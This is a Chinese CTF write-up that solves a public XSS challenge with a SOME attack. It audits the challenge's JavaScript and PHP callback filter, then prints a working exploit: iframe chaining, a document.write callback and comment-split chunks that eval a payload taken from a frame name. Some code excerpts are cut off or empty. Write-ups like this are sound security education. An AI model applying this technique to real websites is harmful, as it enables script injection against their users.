我最近发现了一个大佬出的一道[xss题](https://vulnerabledoma.in/xss_2020-06/)，需要我们执行`alert(document.domain)`。
我们可以使用SOME攻击来实现XSS。
## 代码审计
在`index.html`页面主要的一段JavaScript代码:
    var callback = function(msg) {
          result.innerHTML = msg;
        }
        document.addEventListener('DOMContentLoaded', function(event) {
          if (getQuery('code')) {
            var code = getQuery('code');
            c.value = code;
            checkCode(code);
          }
        });
        form.addEventListener('submit', function(event) {
          checkCode(c.value);
          event.preventDefault();
        });
        function checkCode(code) {
          var s = document.createElement('script');
          s.src = `/xss_2020-06/check_code.php?callback=callback&code=${encodeURI(code)}`;
          document.body.appendChild(s);
        }
        function getQuery(name) {
          return new URL(location.href).searchParams.get(name);
        }
两个监听器都是对同一个东西的监听，只不过方法不同，一个是获取code参数，一个是表单提交，这就造了提交payload的差异。
还需要注意的是checkCode函数，它会使用encodeURI对code参数进行url进行编码。
对于`check_code.php`源码：
    the secret page!";
        }
        else
        {
            $result = "Invalid code: '$key'";
        }
    }
    else
    {
        $result = "Invalid code: too long";
    }
    $json = json_encode($result, JSON_HEX_TAG);
    header('X-XSS-Protection: 0');
    header('X-Content-Type-Options: nosniff');
    header('Content-Type: text/javascript; charset=utf-8');
    print "$callback($json)"
在`check_code.php`中的限制：
  1. 使用`/[^a-z0-9.]+/i`对callback参数的过滤控制。
  2. 使用`length
对于`alert(document.domain)`,我们借助多个iframe和相同来源的跨iframe操作，通过编写HTML和JavaScript代码将payload（``）包含到iframe框架的DOM，将`alert(document.domain)`添加到`name`属性中。
因为长度的限制，我们还需要使用`document.write`来逐步建立payload。
并且有多余字符串`Invalid code:`的干扰，需要注释符来注释这些多余的字符串。
所以最终exp：
        function loadIframe(payload){
            return new Promise(resolve => {
                m.src = `https://vulnerabledoma.in/xss_2020-06/?code=${payload}%26callback=top.x.document.write`;
                m.onload = function(){
                    return resolve(this);
                }
            });
        }
        async function go(){
            await loadIframe("/*");
            await loadIframe("*/eval(/*");
            await loadIframe("*/top[2]/*");
            await loadIframe("*/.name)//");
            await loadIframe("");
        }